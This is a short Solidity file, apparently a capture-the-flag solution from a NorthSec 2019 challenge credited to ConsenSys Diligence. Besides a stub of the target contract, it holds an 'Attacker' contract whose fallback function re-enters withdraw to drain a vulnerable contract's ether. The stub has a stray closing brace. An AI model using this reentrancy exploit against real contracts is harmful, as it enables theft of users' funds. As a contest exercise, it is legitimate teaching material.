// ConsenSys Diligence
// NorthSec 2019
// Montreal, Canada

pragma solidity ^0.5.4;

contract challenge4 {
    function donate(address _to) public payable { }
    function balanceOf(address _who) public view returns (uint balance) {}
    function withdraw(uint _amount) public { }}
}

contract Attacker {

    challenge4 target;
    constructor(address payable targetAddress) public payable {
        target = challenge4(targetAddress);
        target.donate.value(msg.value)(address(this));
    }
    function attack() public {
        target.withdraw(target.balanceOf(address(this)));
    }
    function () external payable {
        if (address(target).balance >= 1 ether) {
            //The check also can be on gas
            target.withdraw(target.balanceOf(address(this)));
        }
    }
}


